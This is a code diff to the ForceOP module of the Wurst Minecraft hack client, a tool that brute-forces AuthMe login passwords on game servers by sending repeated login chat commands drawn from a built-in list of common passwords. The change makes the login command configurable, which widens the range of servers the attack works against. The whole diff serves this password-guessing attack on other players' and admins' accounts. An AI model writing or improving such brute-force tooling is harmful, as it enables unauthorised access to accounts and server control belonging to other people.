@@ -24,12 +24,15 @@ import net.wurstclient.hack.Hack;
 import net.wurstclient.util.ChatUtils;
 import net.wurstclient.util.ForceOpDialog;
 import net.wurstclient.util.MultiProcessingUtils;
+import net.wurstclient.settings.TextFieldSetting;
 
 @SearchTags({"Force OP", "AuthMe Cracker", "AuthMeCracker", "auth me cracker",
 	"admin hack", "AuthMe password cracker"})
 @DontSaveState
 public final class ForceOpHack extends Hack implements ChatInputListener
 {
+	private final TextFieldSetting loginString = new TextFieldSetting("Login String", "login");
+	
 	private final String[] defaultList = {"password", "passwort", "password1",
 		"passwort1", "password123", "passwort123", "pass", "pw", "pw1", "pw123",
 		"hallo", "Wurst", "wurst", "1234", "12345", "123456", "1234567",
@@ -39,16 +42,15 @@ public final class ForceOpHack extends Hack implements ChatInputListener
 		"creeper", "gronkh", "lol", "auth", "authme", "qwerty", "qwertz",
 		"ficken", "ficken1", "ficken123", "fuck", "fuckme", "fuckyou"};
 	private String[] passwords;
-	
 	private boolean gotWrongPwMsg;
 	private int lastPW;
-	
 	private Process process;
 	
 	public ForceOpHack()
 	{
 		super("ForceOP");
 		setCategory(Category.CHAT);
+		addSetting(loginString);
 	}
 	
 	@Override
@@ -165,6 +167,8 @@ public final class ForceOpHack extends Hack implements ChatInputListener
 	
 	private void runForceOP(int delay, boolean waitForMsg)
 	{
+		String cmd = this.loginString.getValue();
+		
 		// abort if disconnected before pressing start
 		if(MC.player == null)
 		{
@@ -172,8 +176,7 @@ public final class ForceOpHack extends Hack implements ChatInputListener
 			return;
 		}
 		
-		MC.getNetworkHandler()
-			.sendChatCommand("login " + MC.getSession().getUsername());
+		MC.getNetworkHandler().sendChatCommand(cmd + " " + MC.getSession().getUsername());
 		lastPW = 0;
 		sendIndexToDialog();
 		
@@ -204,7 +207,7 @@ public final class ForceOpHack extends Hack implements ChatInputListener
 				try
 				{
 					MC.getNetworkHandler()
-						.sendChatCommand("login " + passwords[i]);
+						.sendChatCommand(cmd + " " + passwords[i]);
 					sent = true;
 					
 				}catch(Exception e)
